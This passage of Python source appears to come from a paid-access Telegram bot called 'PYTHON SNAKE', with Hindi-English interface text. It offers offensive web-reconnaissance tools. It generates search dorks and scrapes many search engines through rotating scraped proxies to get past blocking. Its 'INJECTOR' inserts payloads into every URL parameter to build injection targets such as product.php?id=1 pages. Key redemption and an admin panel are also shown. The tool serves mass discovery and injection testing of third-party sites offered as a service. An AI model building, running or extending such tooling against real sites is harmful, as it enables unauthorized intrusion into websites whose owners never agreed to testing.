                     % (esc(i["host"] or "?"), esc(i["host"]), esc(i["file"] or "—"),
                        esc(i["ext"] or "—"), esc(", ".join(i["params"]) or "—"), len(d)))
    all_dorks = _uniq(all_dorks)
    path, cnt = dump_text(all_dorks, "url_reverse",
                          "PYTHON SNAKE — URL reverse dorks\n" + "\n".join(u for u in urls))
    body = (H("URL REVERSE — DONE") + "\n\n" + "\n\n".join(lines[:8]) +
            "\n\n🔗 <b>Total dorks</b>: <code>%d</code>\n\n%s" % (cnt, short_list(all_dorks[:10], 10)))
    parts = chunk_lines(body)
    for i, ch in enumerate(parts[:2]):
        await update.effective_message.reply_text(
            ch, parse_mode=ParseMode.HTML,
            reply_markup=kb_back("m:rev") if i == min(len(parts), 2) - 1 else None)
    await send_file(update, path, "🔗 %d reverse dorks" % cnt)
    context.user_data.pop("await", None)


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL: INJECTOR
# ═══════════════════════════════════════════════════════════════════════════════
async def tool_inj(update, context):
    q = update.callback_query
    txt = (H("INJECTOR") + "\n\n"
           "URLs paste karo (ya pichhle parser result use karo):\n\n"
           "<code>https://target.com/product.php?id=1</code>\n\n"
           "Har URL ke param me payload daal ke test URLs banaunga.")
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("📥 LAST PARSER RESULTS", callback_data="inj:last")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")],
    ])
    try:
        await q.edit_message_text(txt, reply_markup=kb, parse_mode=ParseMode.HTML)
    except Exception:
        pass
    context.user_data["await"] = "inj_urls"


async def cb_inj_last(update, context):
    q = update.callback_query
    urls = context.user_data.get("last_urls") or []
    if not urls:
        try:
            await q.answer("Pehle parser chalao", show_alert=True)
        except Exception:
            pass
        return
    await _run_inject(update, context, urls)


async def input_inj_urls(update, context, text: str):
    urls = [x.strip() for x in re.split(r"[\s,]+", text) if x.strip().startswith("http")]
    if not urls:
        await update.effective_message.reply_text("❌ Koi http URL nahi mila.")
        return
    await _run_inject(update, context, urls[:200])


async def _run_inject(update, context, urls):
    t0 = time.time()
    out = inject_all_payloads(urls)
    took = time.time() - t0
    if not out:
        await update.effective_message.reply_text("❌ Kuch nahi bana.")
        return
    path, cnt = dump_text(out, "inject", "PYTHON SNAKE — injector targets")
    txt = (H("INJECTOR — DONE") + "\n\n"
           "🎯 Input URLs : <code>%s</code>\n"
           "💉 Payloads   : <code>%d</code>\n"
           "✅ Targets    : <code>%s</code>\n"
           "⏱ Time       : <code>%.2fs</code>\n\n%s"
           % (fmt(len(urls)), len(PAYLOADS), fmt(cnt), took, short_list(out[:8], 8)))
    await update.effective_message.reply_text(txt, parse_mode=ParseMode.HTML,
                                              reply_markup=kb_back("m:inj"))
    await send_file(update, path, "💉 %d injection targets" % cnt)
    context.user_data.pop("await", None)


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL: PARSER
# ═══════════════════════════════════════════════════════════════════════════════
async def tool_parse(update, context):
    q = update.callback_query
    last = context.user_data.get("last_dorks") or []
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("📥 USE LAST %d DORKS" % len(last), callback_data="pr:last")],
        [InlineKeyboardButton("✍️ MANUAL DORK", callback_data="pr:manual")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")],
    ])
    txt = (H("PARSER", "asli engines = asli URLs") + "\n\n"
           "Engines: DDG • Bing • Mojeek • Yahoo • Brave • Startpage • Google\n"
           "Proxy: %s\n\n"
           "Dork list bhejo (ek line me ek) — ya upar se LAST DORKS chuno."
           % ("✅ %d ready" % len(PROXIES or load_proxy_pool()) if (PROXIES or load_proxy_pool()) else "⚪ none (no-proxy mode)"))
    try:
        await q.edit_message_text(txt, reply_markup=kb, parse_mode=ParseMode.HTML)
    except Exception:
        pass


async def cb_parse_last(update, context):
    q = update.callback_query
    dorks = context.user_data.get("last_dorks") or []
    if not dorks:
        try:
            await q.answer("Pehle DORKER chalao", show_alert=True)
        except Exception:
            pass
        return
    context.user_data["parse_dorks"] = dorks[:30]
    try:
        await q.edit_message_text(H("PARSER") + "\n\nKitne URLs chahiye? <b>Number bhejo</b>\n"
                                  "<i>Recommended: 100</i>", parse_mode=ParseMode.HTML,
                                  reply_markup=kb_back("m:parse"))
    except Exception:
        pass
    context.user_data["await"] = "parse_max"


async def cb_parse_manual(update, context):
    q = update.callback_query
    try:
        await q.edit_message_text(H("PARSER — MANUAL") + "\n\nDork(s) bhejo (ek line me ek):",
                                  parse_mode=ParseMode.HTML, reply_markup=kb_back("m:parse"))
    except Exception:
        pass
    context.user_data["await"] = "parse_dorks"


async def input_parse_dorks(update, context, text: str):
    dorks = [x.strip() for x in text.split("\n") if x.strip()][:50]
    if not dorks:
        await update.effective_message.reply_text("❌ Koi dork nahi mila.")
        return
    context.user_data["parse_dorks"] = dorks
    await update.effective_message.reply_text(
        H("PARSER") + "\n\n<b>%d dorks</b> mile.\nKitne URLs chahiye? Number bhejo\n"
        "<i>Recommended: 100</i>" % len(dorks), parse_mode=ParseMode.HTML,
        reply_markup=kb_back("m:parse"))


async def input_parse_max(update, context, text: str):
    try:
        mx = int(re.sub(r"[^0-9]", "", text) or "100")
    except Exception:
        mx = 100
    mx = max(5, min(20000, mx))
    dorks = context.user_data.get("parse_dorks") or context.user_data.get("last_dorks") or []
    if not dorks:
        await update.effective_message.reply_text("❌ Dork nahi mile. DORKER chalao.")
        return
    msg = await update.effective_message.reply_text(
        "⏳ Parsing chal rahi hai…\n🎯 %d dorks → max %d URLs" % (len(dorks), mx))
    t0 = time.time()
    last = {"t": 0.0}

    async def prog(st):
        if time.time() - last["t"] < 3:
            return
        last["t"] = time.time()
        try:
            await msg.edit_text(
                "🔍 <b>PARSING — LIVE</b>\n" + "─" * 26 +
                "\n🎯 Dorks   : <code>%d/%d</code> %s\n🔗 URLs    : <code>%s</code>\n"
                "⏱ Time    : <code>%.0fs</code>"
                % (st["dorks"], st["total"],
                   bar(st["dorks"] / max(1, st["total"]) * 100),
                   fmt(st["urls"]), time.time() - t0),
                parse_mode=ParseMode.HTML)
        except Exception:
            pass

    res = await parse(dorks, max_urls=mx, pages=sget("parse_pages", 1),
                      use_proxy=bool(PROXIES or load_proxy_pool()), progress=prog)
    took = time.time() - t0
    urls = res["urls"]
    context.user_data["last_urls"] = urls
    st = res["stats"]
    if not urls:
        blocked = st["blocked"]
        txt = (H("PARSER — 0 URLs") + "\n\n"
               "❌ Koi URL nahi mila.\n\n"
               "🔍 Queries   : <code>%d</code>\n"
               "🚫 Blocked   : <code>%d</code>\n"
               "🧅 Proxies   : <code>%d</code>\n\n"
               "👉 <b>Proxy add karo</b> — 🧅 PROXY ENGINE se\n"
               "👉 Ya mode badlo: dork simple karo\n"
               "👉 Ya thodi der baad try karo (engine rate-limit)"
               % (st["queries"], blocked, len(PROXIES)))
    else:
        eng = ", ".join("%s:%d" % (k, v) for k, v in sorted(st["engine_hits"].items(), key=lambda z: -z[1])[:4])
        txt = (H("PARSER — DONE") + "\n\n"
               "🔗 URLs      : <code>%s</code>\n"
               "🎯 Dorks     : <code>%d</code>\n"
               "🔍 Queries   : <code>%d</code>\n"
               "🚫 Blocked   : <code>%d</code>\n"
               "⏱ Time      : <code>%.1fs</code>\n"
               "⚙️ Engines   : <code>%s</code>\n\n%s"
               % (fmt(len(urls)), len(dorks), st["queries"], st["blocked"], took, esc(eng),
                  short_list(urls[:10], 10)))
    try:
        await msg.delete()
    except Exception:
        pass
    for ch in chunk_lines(txt)[:3]:
        await update.effective_message.reply_text(ch, parse_mode=ParseMode.HTML)
    if urls:
        path, cnt = dump_text(urls, "parser", "PYTHON SNAKE — parsed URLs")
        await send_file(update, path, "🔍 %d real URLs" % cnt)
    await update.effective_message.reply_text("⬅️ Menu", reply_markup=kb_back("m:home"))
    context.user_data.pop("await", None)


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL: PROXY
# ═══════════════════════════════════════════════════════════════════════════════
async def tool_proxy(update, context):
    q = update.callback_query
    pool = PROXIES or load_proxy_pool()
    txt = (H("PROXY ENGINE", "%d sources • DoH bypass • 400 parallel" % len(PROXY_SOURCES)) + "\n\n"
           "🧅 Pool abhi : <code>%d</code> proxies\n"
           "📄 Manual    : <code>%d</code> (data/manual_proxies.txt)\n\n"
           "Scan chalu karein?" % (len(pool), len(manual_proxies())))
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 SCRAPE + CHECK", callback_data="px:run")],
        [InlineKeyboardButton("📊 POOL STATUS", callback_data="px:stat")],
        [InlineKeyboardButton("🗑 CLEAR", callback_data="px:clear")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")],
    ])
    try:
        await q.edit_message_text(txt, reply_markup=kb, parse_mode=ParseMode.HTML)
    except Exception:
        pass


async def cb_proxy_run(update, context):
    q = update.callback_query
    t0 = time.time()
    await q.edit_message_text("⏳ <b>Step 1/2</b> — 45 sources scrape ho rahe hain…",
                              parse_mode=ParseMode.HTML)

    async def src_prog(st):
        try:
            await q.edit_message_text(
                "🧅 <b>SCRAPING</b>\n" + "─" * 26 +
                "\n📡 Sources : <code>%d/%d</code> %s\n✅ OK      : <code>%d</code>\n"
                "🔢 Mila    : <code>%s</code>"
                % (st["done"], st["total"], bar(st["done"] / max(1, st["total"]) * 100),
                   st["ok"], fmt(st["px"])), parse_mode=ParseMode.HTML)
        except Exception:
            pass

    px = await scrape_proxies(progress=src_prog, force=True)
    px = _uniq(px + manual_proxies())
    if not px:
        await q.edit_message_text(
            (H("PROXY — 0 MILE") + "\n\n"
             "❌ Koi source khula hi nahi.\n\n"
             "🌐 Sources : <code>0/%d</code>\n\n"
             "👉 <b>Net/DNS block</b> lag raha hai:\n"
             "• WiFi ↔ mobile data switch karo\n"
             "• Ya <code>data/manual_proxies.txt</code> me proxies daalo\n"
             "   (1 line = 1 proxy, jaise <code>1.2.3.4:8080</code>)"
             % len(PROXY_SOURCES)),
            reply_markup=kb_back("m:proxy"), parse_mode=ParseMode.HTML)
        return

    await q.edit_message_text("⏳ <b>Step 2/2</b> — %s proxies check ho rahe hain…\n"
                              "<i>(400 parallel — fast)</i>" % fmt(len(px)),
                              parse_mode=ParseMode.HTML)

    async def chk_prog(st):
        try:
            await q.edit_message_text(
                "🔍 <b>CHECKING</b>\n" + "─" * 26 +
                "\n📥 Total   : <code>%s</code>\n🔍 Checked : <code>%s/%s</code> %s\n"
                "✅ Alive   : <code>%d</code>"
                % (fmt(st["total"]), fmt(st["done"]), fmt(st["total"]),
                   bar(st["done"] / max(1, st["total"]) * 100), st["alive"]),
                parse_mode=ParseMode.HTML)
        except Exception:
            pass

    good = await check_proxies(px[:4000], concurrency=400, timeout=6.0,
                               progress=chk_prog, want=200)
    save_proxy_pool(good)
    took = time.time() - t0
    src_ok = PROXIES and PSTATS.get("sources_ok", 0)
    txt = (H("PROXY — DONE") + "\n\n"
           "📥 Scraped  : <code>%s</code>\n"
           "🔍 Checked  : <code>%s</code>\n"
           "✅ Alive    : <code>%d</code>\n"
           "⏱ Time     : <code>%.1fs</code>\n\n"
           "🌐 Sources  : <code>%d/%d</code> OK • raw lines: <code>%s</code>"
           % (fmt(len(px)), fmt(min(len(px), 4000)), len(good), took,
              PSTATS.get("sources_ok", 0), len(PROXY_SOURCES), fmt(PSTATS.get("raw", 0))))
    if good:
        txt += "\n⚡ Best: <code>%d ms</code>\n\n<b>Top 5:</b>\n%s" % (
            good[0]["ms"], "\n".join("• <code>%s</code> — %dms"
                                     % (esc(g["url"].replace("http://", "")), g["ms"])
                                     for g in good[:5]))
        txt += "\n\n✅ Parser ab inhe use karega."
    elif PSTATS.get("sources_ok", 0) == 0:
        txt += ("\n\n⚠️ <b>Koi source khula hi nahi</b> — net/DNS block.\n"
                "👉 WiFi ↔ mobile data switch karo, ya manual file banao.")
    else:
        txt += ("\n\n⚠️ Sources khule par koi proxy alive nahi.\n"
                "👉 Thodi der baad dobara scan karo.")
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔁 SCAN AGAIN", callback_data="px:run")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="m:proxy")],
    ])
    try:
        await q.edit_message_text(txt, reply_markup=kb, parse_mode=ParseMode.HTML)
    except Exception:
        pass


async def cb_proxy_stat(update, context):
    q = update.callback_query
    pool = PROXIES or load_proxy_pool()
    d = jload("proxies", {})
    txt = (H("PROXY POOL") + "\n\n"
           "✅ Alive    : <code>%d</code>\n"
           "📄 Manual   : <code>%d</code>\n"
           "🕐 Updated  : <code>%s</code>\n\n%s"
           % (len(pool), len(manual_proxies()), esc(d.get("at") or "—"),
              short_list([p["url"].replace("http://", "") + (" (%dms)" % p.get("ms", 0))
                          for p in pool[:12]], 12)))
    try:
        await q.edit_message_text(txt, reply_markup=kb_back("m:proxy"), parse_mode=ParseMode.HTML)
    except Exception:
        pass


async def cb_proxy_clear(update, context):
    q = update.callback_query
    save_proxy_pool([])
    try:
        await q.edit_message_text(H("PROXY") + "\n\n🗑 Pool clear ho gaya.",
                                  reply_markup=kb_back("m:proxy"), parse_mode=ParseMode.HTML)
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL: QUALITY / RANDOMIZER / DUMPER
# ═══════════════════════════════════════════════════════════════════════════════
async def tool_qa(update, context):
    q = update.callback_query
    txt = (H("QUALITY CHECK") + "\n\n"
           "Dork/keyword paste karo (ek line me ek) — har ek ko <b>0-100</b> score "
           "dunga + wajah bataunga.")
    try:
        await q.edit_message_text(txt, reply_markup=kb_back(), parse_mode=ParseMode.HTML)
    except Exception:
        pass
    context.user_data["await"] = "qa_items"


async def input_qa(update, context, text: str):
    items = [x.strip() for x in text.split("\n") if x.strip()][:40]
    if not items:
        await update.effective_message.reply_text("❌ Kuch nahi mila.")
        return
    lines, scores = [], []
    for it in items:
        sc, why = score_dork(it) if re.search(r"(inurl|intitle|intext|site|filetype):", it, re.I) else score_keyword(it)
        scores.append(sc)
        lines.append("<b>%d/100</b> %s\n<code>%s</code>\n<i>%s</i>"
                     % (sc, quality_label(sc), esc(it[:120]), esc("; ".join(why[:3]))))
    avg = sum(scores) / len(scores)
    body = (H("QUALITY REPORT", "avg %.0f/100" % avg) + "\n\n" + "\n\n".join(lines[:12]))
    for ch in chunk_lines(body)[:3]:
        await update.effective_message.reply_text(ch, parse_mode=ParseMode.HTML)
    if len(items) > 12:
        await update.effective_message.reply_text("…+%d aur (file me)" % (len(items) - 12))
    path, cnt = dump_text(["%3d  %s" % (s, i) for s, i in zip(scores, items)], "quality",
                          "PYTHON SNAKE — quality scores")
    await send_file(update, path, "📊 %d scored" % cnt)
    context.user_data.pop("await", None)


async def tool_rand(update, context):
    q = update.callback_query
    last = context.user_data.get("last_dorks") or []
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("📥 LAST %d DORKS" % len(last), callback_data="rd:last")],
        [InlineKeyboardButton("✍️ MANUAL", callback_data="rd:manual")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")],
    ])
    try:
        await q.edit_message_text(H("RANDOMIZER") + "\n\n"
                                  "Dorks ko shuffle + operator mutate karta hai "
                                  "(inurl ↔ allinurl, site ↔ site:.com …)",
                                  reply_markup=kb, parse_mode=ParseMode.HTML)
    except Exception:
        pass


async def cb_rand_last(update, context):
    q = update.callback_query
    dorks = context.user_data.get("last_dorks") or []
    if not dorks:
        try:
            await q.answer("Pehle DORKER chalao", show_alert=True)
        except Exception:
            pass
        return
    out = randomize_dorks(dorks, n=min(len(dorks) * 2, 300))
    path, cnt = dump_text(out, "random", "PYTHON SNAKE — randomized dorks")
    try:
        await q.edit_message_text(H("RANDOMIZER — DONE") + "\n\n🔀 %s dorks\n\n%s"
                                  % (fmt(cnt), short_list(out[:10], 10)),
                                  reply_markup=kb_back("m:rand"), parse_mode=ParseMode.HTML)
    except Exception:
        pass
    await send_file(update, path, "🎲 %d randomized" % cnt)


async def cb_rand_manual(update, context):
    q = update.callback_query
    try:
        await q.edit_message_text(H("RANDOMIZER") + "\n\nDorks paste karo:",
                                  reply_markup=kb_back("m:rand"), parse_mode=ParseMode.HTML)
    except Exception:
        pass
    context.user_data["await"] = "rand_items"


async def input_rand(update, context, text: str):
    items = [x.strip() for x in text.split("\n") if x.strip()]
    if not items:
        return
    out = randomize_dorks(items, n=min(len(items) * 2, 300))
    path, cnt = dump_text(out, "random", "PYTHON SNAKE — randomized dorks")
    await update.effective_message.reply_text(
        H("RANDOMIZER — DONE") + "\n\n🔀 %s dorks\n\n%s" % (fmt(cnt), short_list(out[:8], 8)),
        parse_mode=ParseMode.HTML, reply_markup=kb_back("m:rand"))
    await send_file(update, path, "🎲 %d randomized" % cnt)
    context.user_data.pop("await", None)


async def tool_dump(update, context):
    q = update.callback_query
    files = dumps_list(12)
    if not files:
        try:
            await q.edit_message_text(H("DUMPER") + "\n\n📭 Abhi koi file nahi bani.",
                                      reply_markup=kb_back(), parse_mode=ParseMode.HTML)
        except Exception:
            pass
        return
    rows = [[InlineKeyboardButton("📄 %s (%.0f KB)" % (os.path.basename(f)[:28],
                                                       os.path.getsize(f) / 1024),
                                  callback_data="df:%d" % i)]
            for i, f in enumerate(files)]
    rows.append([InlineKeyboardButton("📦 SAB ZIP", callback_data="df:zip")])
    rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="m:home")])
    try:
        await q.edit_message_text(H("DUMPER", "%d files" % len(files)) + "\n\nKaun si file?",
                                  reply_markup=InlineKeyboardMarkup(rows), parse_mode=ParseMode.HTML)
    except Exception:
        pass


async def cb_dump_file(update, context):
    q = update.callback_query
    arg = q.data.split(":", 1)[1]
    files = dumps_list(12)
    if arg == "zip":
        name = os.path.join(DUMP_DIR, "all_dumps_%s.zip" % stamp())
        try:
            with zipfile.ZipFile(name, "w", zipfile.ZIP_DEFLATED) as zf:
                for f in dumps_list(60):
                    zf.write(f, arcname=os.path.basename(f))
        except Exception as exc:
            try:
                await q.answer("ZIP fail: %s" % exc, show_alert=True)
            except Exception:
                pass
            return
        await send_file(update, name, "📦 saare dumps")
        return
    try:
        idx = int(arg)
        await send_file(update, files[idx], "📄 " + os.path.basename(files[idx]))
    except Exception:
        try:
            await q.answer("File nahi mili", show_alert=True)
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════════════════════════
#  TEXT ROUTER
# ═══════════════════════════════════════════════════════════════════════════════
AWAIT_HANDLERS = {
    "dork_count": input_dork_count,
    "kw_seeds": input_kw_seeds,
    "rev_urls": input_rev_urls,
    "inj_urls": input_inj_urls,
    "parse_dorks": input_parse_dorks,
    "parse_max": input_parse_max,
    "qa_items": input_qa,
    "rand_items": input_rand,
    "key_redeem": None,
    "bc_text": None,
}


async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = (update.message.text or "").strip()
    if not context.user_data.get("verified"):
        q, kb = captcha_new(context)
        await update.message.reply_text(q, reply_markup=kb, parse_mode=ParseMode.HTML)
        return
    if not access_ok(uid):
        await update.message.reply_text(need_key_text(uid), parse_mode=ParseMode.HTML,
                                        reply_markup=kb_needkey())
        return
    if context.user_data.get("await_admin") and not is_admin(uid):
        context.user_data.pop("await", None)
        context.user_data.pop("await_admin", None)
        return
    wait = context.user_data.get("await")
    fn = AWAIT_HANDLERS.get(wait)
    if fn:
        context.user_data.pop("await", None)
        context.user_data.pop("await_admin", None)
        return await fn(update, context, text)
    await update.message.reply_text("🤔 Samajh nahi aaya. Menu se tool chuno:",
                                    reply_markup=kb_main())

TOOL_HANDLERS = {
    "dork": tool_dork,
    "kw": tool_kw,
    "rev": tool_rev,
    "inj": tool_inj,
    "parse": tool_parse,
    "proxy": tool_proxy,
    "qa": tool_qa,
    "rand": tool_rand,
    "dump": tool_dump,
}


# ═══════════════════════════════════════════════════════════════════════════════
#  REDEEM KEY
# ═══════════════════════════════════════════════════════════════════════════════
def redeem_key(uid, key: str) -> tuple:
    key = (key or "").strip().upper()
    rec = KEYS.get(key)
    if not rec:
        return False, "❌ Key nahi mili."
    if rec.get("used_by") and str(rec["used_by"]) != str(uid):
        return False, "❌ Ye key pehle use ho chuki hai."
    days = int(rec.get("days") or 0)
    u = USERS.setdefault(str(uid), {})
    base = datetime.now()
    try:
        cur = datetime.fromisoformat(u.get("expires") or "")
        if cur > base:
            base = cur
    except Exception:
        pass
    u["expires"] = (base + timedelta(days=days)).isoformat(timespec="seconds")
    rec["used_by"] = str(uid)
    rec["used_at"] = datetime.now().isoformat(timespec="seconds")
    USERS[str(uid)] = u
    save_all()
    return True, ("✅ Key redeem ho gayi!\n📅 +%d din\n⏳ Valid till <b>%s</b>"
                  % (days, esc(u["expires"][:16].replace("T", " "))))


TOOL_HANDLERS["redeem"] = lambda *a, **k: tool_redeem(*a, **k)


async def tool_redeem(update, context):
    q = update.callback_query
    txt = (H("REDEEM KEY") + "\n\nKey bhejo (jaise <code>SNK-AB12-CD34</code>):")
    try:
        await q.edit_message_text(txt, reply_markup=kb_back("m:home"), parse_mode=ParseMode.HTML)
    except Exception:
        pass
    context.user_data["await"] = "key_redeem"


AWAIT_HANDLERS["key_redeem"] = lambda *a, **k: input_redeem(*a, **k)


async def input_redeem(update, context, text: str):
    ok, msg = redeem_key(update.effective_user.id, text)
    await update.effective_message.reply_text(msg, parse_mode=ParseMode.HTML,
                                              reply_markup=kb_main() if ok else None)
    if ok:
        await show_home(update, update.effective_user.id, edit=False)


# ═══════════════════════════════════════════════════════════════════════════════
#  ADMIN PANEL
# ═══════════════════════════════════════════════════════════════════════════════
def kb_admin() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 DASHBOARD", callback_data="a:dash"),
         InlineKeyboardButton("👥 USERS", callback_data="a:users")],
        [InlineKeyboardButton("🔑 KEYS", callback_data="a:keys"),
         InlineKeyboardButton("🧅 PROXY", callback_data="a:proxy")],
        [InlineKeyboardButton("⚙️ ENGINE", callback_data="a:eng"),
         InlineKeyboardButton("📦 DUMPS", callback_data="a:dumps")],
        [InlineKeyboardButton("📣 BROADCAST", callback_data="a:bc"),
         InlineKeyboardButton("🚫 BANS", callback_data="a:bans")],
        [InlineKeyboardButton("💾 BACKUP", callback_data="a:backup"),
         InlineKeyboardButton("🖥 SYSTEM", callback_data="a:sys")],
        [InlineKeyboardButton("🧹 CLEAR DUMPS", callback_data="a:cleardumps"),
         InlineKeyboardButton("📜 LOGS", callback_data="a:logs")],
        [InlineKeyboardButton("🔄 RESTART BOT", callback_data="a:restart")],
        [InlineKeyboardButton("⬅️ MAIN MENU", callback_data="m:home")],
    ])


def admin_dash() -> str:
    total = len(USERS)
    active = sum(1 for u in USERS.values() if (u.get("expires") or "") > datetime.now().isoformat())
    banned = sum(1 for u in USERS.values() if u.get("banned"))
    pool = PROXIES or load_proxy_pool()
    c = db_counts()
    try:
        up = int(time.time() - os.path.getmtime(os.path.join(BASE_DIR, "snake_core.py")))
        upt = "%dh %dm" % (up // 3600, (up % 3600) // 60)
    except Exception:
        upt = "—"
    return (H("ADMIN DASHBOARD", "CORE %s" % VERSION) + "\n\n"
            "👥 Users    : <code>%s</code> (active <b>%d</b>, banned <b>%d</b>)\n"
            "🔑 Keys     : <code>%d</code> (unused <b>%d</b>)\n"
            "🧅 Proxies  : <code>%d</code> alive\n"
            "📦 Dumps    : <code>%d</code> files\n"
            "🗄 DB       : <code>%s</code> dorks • <code>%s</code> params\n"
            "⏱ Uptime   : <code>%s</code>"
            % (fmt(total), active, banned, len(KEYS),
               sum(1 for k in KEYS.values() if not k.get("used_by")),
               len(pool), len(dumps_list(999)), fmt(c["dorks"]), fmt(c["parameters"]), upt))


async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.effective_message.reply_text("🚫 Access denied.")
        return
    await update.effective_message.reply_text(admin_dash(), reply_markup=kb_admin(),
                                              parse_mode=ParseMode.HTML)


async def admin_callback(update, context, action: str):
    q = update.callback_query
    uid = update.effective_user.id
    if not is_admin(uid):
        try:
            await q.answer("Admin only", show_alert=True)
        except Exception:
            pass
        return

    async def ed(txt, kb=None):
        try:
            await q.edit_message_text(txt, reply_markup=kb or kb_back("a:home"),
                                      parse_mode=ParseMode.HTML)
        except Exception:
            pass

    if action == "home":
        return await ed(admin_dash(), kb_admin())
    if action == "dash":
        return await ed(admin_dash(), kb_admin())

    if action == "users":
        rows = [[InlineKeyboardButton("⬇️ CSV EXPORT", callback_data="a:userscsv")]]
        rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="a:home")])
        lst = sorted(USERS.items(), key=lambda z: z[1].get("last") or "", reverse=True)[:20]
        body = "\n".join("• <code>%s</code> %s %s" % (
            u, esc((r.get("name") or "?")[:18]),
            "🚫" if r.get("banned") else ("✅" if (r.get("expires") or "") > datetime.now().isoformat() else "⚪"))
            for u, r in lst) or "—"
        return await ed(H("ADMIN — USERS", "%d total" % len(USERS)) + "\n\n" + body,
                       InlineKeyboardMarkup(rows))

    if action == "userscsv":
        path = dump_json(USERS, "users")
        await send_file(update, path, "👥 users.json")
        return

    if action == "keys":
        unused = sum(1 for k in KEYS.values() if not k.get("used_by"))
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("➕ 7 DIN", callback_data="a:genkey:7"),
             InlineKeyboardButton("➕ 30 DIN", callback_data="a:genkey:30")],
            [InlineKeyboardButton("➕ 90 DIN", callback_data="a:genkey:90"),
             InlineKeyboardButton("♾ 365 DIN", callback_data="a:genkey:365")],
            [InlineKeyboardButton("📋 LIST", callback_data="a:keylist")],
            [InlineKeyboardButton("⬅️ BACK", callback_data="a:home")],
        ])
        return await ed(H("ADMIN — KEYS", "%d total • %d unused" % (len(KEYS), unused)) +
                        "\n\nNaya key kis duration ka?", kb)

    if action.startswith("genkey:"):
        days = int(action.split(":")[1])
        key = "SNK-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=4)) + "-" + \
              "".join(random.choices(string.ascii_uppercase + string.digits, k=4))
        KEYS[key] = {"days": days, "created": datetime.now().isoformat(timespec="seconds")}
        save_all()
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("➕ AUR 7D", callback_data="a:genkey:7")],
            [InlineKeyboardButton("⬅️ BACK", callback_data="a:keys")],
        ])
        return await ed(H("KEY BAN GAYI") + "\n\n<code>%s</code>\n\n📅 %d din\n\n"
                        "<i>Copy karke user ko bhejo.</i>" % (key, days), kb)

    if action == "keylist":
        items = list(KEYS.items())[-25:]
        body = "\n".join("• <code>%s</code> %dd %s" % (k, v.get("days", 0),
                                                       ("✅ " + str(v.get("used_by"))) if v.get("used_by") else "⚪ unused")
                         for k, v in items) or "—"
        return await ed(H("KEYS", "%d total" % len(KEYS)) + "\n\n" + body)

    if action == "proxy":
        pool = PROXIES or load_proxy_pool()
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🚀 SCAN NOW", callback_data="a:pxscan")],
            [InlineKeyboardButton("🗑 CLEAR", callback_data="a:pxclear")],
            [InlineKeyboardButton("⬅️ BACK", callback_data="a:home")],
        ])
        return await ed(H("ADMIN — PROXY") + "\n\n✅ Alive: <code>%d</code>\n📄 Manual: <code>%d</code>\n"
                        "🌐 Sources: <code>%d</code>\n\n%s"
                        % (len(pool), len(manual_proxies()), len(PROXY_SOURCES),
                           short_list([p["url"].replace("http://", "") for p in pool[:12]], 12)), kb)

    if action == "pxscan":
        await ed("⏳ Admin scan chal raha hai…")
        px = _uniq(await scrape_proxies(force=True) + manual_proxies())
        good = await check_proxies(px[:4000], concurrency=400, want=200)
        save_proxy_pool(good)
        return await ed(H("ADMIN — PROXY") + "\n\nScraped: <code>%s</code>\nAlive: <code>%d</code>\n"
                        "Sources: <code>%d/%d</code>"
                        % (fmt(len(px)), len(good), PSTATS.get("sources_ok", 0), len(PROXY_SOURCES)),
                        InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ BACK", callback_data="a:proxy")]]))

    if action == "pxclear":
        save_proxy_pool([])
        return await ed("🗑 Pool clear.", InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ BACK", callback_data="a:proxy")]]))

    if action == "eng":
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("Pages: %s" % sget("parse_pages", 1), callback_data="a:setpages")],
            [InlineKeyboardButton("Check timeout: %ss" % sget("check_timeout", 6), callback_data="a:setto")],
            [InlineKeyboardButton("Concurrency: %s" % sget("concurrency", 400), callback_data="a:setconc")],
            [InlineKeyboardButton("⬅️ BACK", callback_data="a:home")],
        ])
        return await ed(H("ADMIN — ENGINE") + "\n\nIn settings ko badalne ke liye button dabao "
                        "(value cycle hoti hai).", kb)

    if action == "setpages":
        v = int(sget("parse_pages", 1))
        v = 1 if v >= 5 else v + 1
        sset("parse_pages", v)
        return await admin_callback(update, context, "eng")
    if action == "setto":
        v = int(sget("check_timeout", 6))
        v = 4 if v >= 12 else v + 2
        sset("check_timeout", v)
        return await admin_callback(update, context, "eng")
    if action == "setconc":
        v = int(sget("concurrency", 400))
        v = 100 if v >= 800 else v + 100
        sset("concurrency", v)
        return await admin_callback(update, context, "eng")

    if action == "dumps":
        files = dumps_list(10)
        body = "\n".join("• <code>%s</code> %.0f KB" % (os.path.basename(f)[:40],
                                                        os.path.getsize(f) / 1024) for f in files) or "—"
        return await ed(H("ADMIN — DUMPS", "%d files" % len(files)) + "\n\n" + body)

    if action == "cleardumps":
        n = 0
        for f in dumps_list(9999):
            try:
                os.remove(f)
                n += 1
            except Exception:
                pass
        return await ed("🧹 %d files delete." % n, InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ BACK", callback_data="a:home")]]))

    if action == "bc":
        context.user_data["await"] = "bc_text"
        context.user_data["await_admin"] = True
